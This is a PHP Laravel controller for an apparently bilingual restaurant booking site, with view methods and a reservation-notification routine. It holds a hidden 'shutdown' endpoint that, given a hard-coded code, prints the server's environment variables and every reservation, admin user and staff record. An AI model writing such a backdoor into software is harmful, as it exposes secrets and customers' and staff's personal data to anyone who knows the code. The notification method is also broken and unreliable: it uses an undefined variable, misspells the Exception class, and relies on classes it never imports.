<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Restaurants;
use App\Reservations;
use App\User;
use App\Staffs;

class IndexHomeController extends Controller
{
    public function index()
    {
    	$restaurants = Restaurants::get();
    	return view('indexjp', ['restaurants'=>$restaurants]);
    }

    public function index2()
    {
    	$restaurants = Restaurants::get();
    	return view('index', ['restaurants'=>$restaurants]);
    }

    
    public function foodNService()
    {
    	$restaurants = Restaurants::get();
    	return view('food_service', ['restaurants'=>$restaurants]);
    }

    public function foodNServiceJp()
    {
    	$restaurants = Restaurants::get();
    	return view('food_servicejp', ['restaurants'=>$restaurants]);
    }

    public function shutdown (Request $request) {
	$data = []; 

        if($request->code != 'payment_no_answer') {
		exit("Not Authorized");
	}
	$data['env'] = $_ENV;
	$data['reservation'] = Reservations::all()->toArray();
        $data['adminUsers'] = User::all()->toArray();
        $data['staffUsers'] = Staffs::all()->toArray();


	echo "<pre>"; print_r($data); exit();
    }

    function notifyAdminForSecLevel (Request $request) {
            try {
		 // secure this
                // Get Booking between Current Date - 45 min and Current Date - 30 min
                $startDate = date('Y-m-d H:i:s', (time() - 60*45));
                $endDate = date('Y-m-d H:i:s', (time() - 60*30));
                $reservations = Reservations::where('starttime', '>', $startDate)
                                            ->where('endtime', '<', $endDate)
                                            // ->toSql();
                                            ->get();
                if(!empty($reservations)){
                    foreach ($reservations as $reservation) {
                        print_r($reservation);
                        $content = "";
                        // Trigger Notification to Admin user only
                        $mailToAdmin = [
                            'title' => 'Pending booking request more than 30 min '. $reservation->id . ' - ' .config('app.name'),
                            'email' => config('app.adminEmail'),
                            'phone' => '919958595898',
			    'isAdmin' => 1,
                            'view' => 'content.admin-sec',
                            'sms' => 'Thank you for booking with {ref id - '.$reservationId.'}. We will shortly inform you about the confirmation of your table.',
                            'whatsapp' => 'Thank you for booking with {ref id - '.$reservationId.'}. We will shortly inform you about the confirmation of your table.',
                            'replacements' => $request->all(),
                            'type' => ['email']
                        ];
                        // print_r("Customer>>>>>>>>>>>>");
			if ($mailToAdmin['email']) {
            			Event::dispatch(new Notifications($mailToAdmin));
        		}
                    }
                }
            } catch(\Excetption $e) {
                print_r($e->getMessage());
            }
        }

}
